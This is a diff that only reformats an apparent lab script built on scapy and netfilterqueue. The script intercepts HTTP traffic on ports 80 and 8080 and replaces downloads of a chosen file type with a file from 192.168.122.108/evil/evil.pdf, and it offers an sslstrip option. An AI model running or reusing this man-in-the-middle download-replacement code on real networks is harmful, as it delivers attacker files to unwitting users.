@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 
-import argparse             # https://docs.python.org/3/library/argparse.html
-import netfilterqueue       # https://github.com/oremanj/python-netfilterqueue
-import os                   # https://docs.python.org/3/library/os.html
-import scapy.all as scapy   # https://scapy.readthedocs.io/en/latest/index.html
-import subprocess           # https://docs.python.org/3/library/subprocess.html
-import sys                  # https://docs.python.org/3/library/sys.html
-import textwrap             # https://docs.python.org/3/library/textwrap.html
+import argparse  # https://docs.python.org/3/library/argparse.html
+import netfilterqueue  # https://github.com/oremanj/python-netfilterqueue
+import os  # https://docs.python.org/3/library/os.html
+import scapy.all as scapy  # https://scapy.readthedocs.io/en/latest/index.html
+import subprocess  # https://docs.python.org/3/library/subprocess.html
+import sys  # https://docs.python.org/3/library/sys.html
+import textwrap  # https://docs.python.org/3/library/textwrap.html
 
 ack_list = []
 
@@ -28,8 +28,12 @@ def get_args():
         ),
     )
     parser.add_argument("-e", "--extension", default=".pdf", help="File extension")
-    parser.add_argument("-d", "--destination", default="sslstrip", help="sslstrip, forward, or local")
-    parser.add_argument("-u", "--url", default="192.168.122.108/evil/evil.pdf", help="Replacement url")
+    parser.add_argument(
+        "-d", "--destination", default="sslstrip", help="sslstrip, forward, or local"
+    )
+    parser.add_argument(
+        "-u", "--url", default="192.168.122.108/evil/evil.pdf", help="Replacement url"
+    )
     values = parser.parse_args()
     return values
 
@@ -111,10 +115,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         # print(scapy_packet.show()
         # tcp dport = destination (request)
-        if (
-            scapy_packet[scapy.TCP].dport == 80
-            or scapy_packet[scapy.TCP].dport == 8080
-        ):
+        if scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].dport == 8080:
             print(str(scapy_packet[scapy.Raw].load))
             print(options.extension)
             # If target extension is in the load, wait for
@@ -127,8 +128,7 @@ def process_packet(packet):
 
         # tcp sport = source (response)
         elif (
-            scapy_packet[scapy.TCP].sport == 80
-            or scapy_packet[scapy.TCP].sport == 8080
+            scapy_packet[scapy.TCP].sport == 80 or scapy_packet[scapy.TCP].sport == 8080
         ):
             # If it is a response we have been waiting for
             if scapy_packet[scapy.TCP].seq in ack_list:
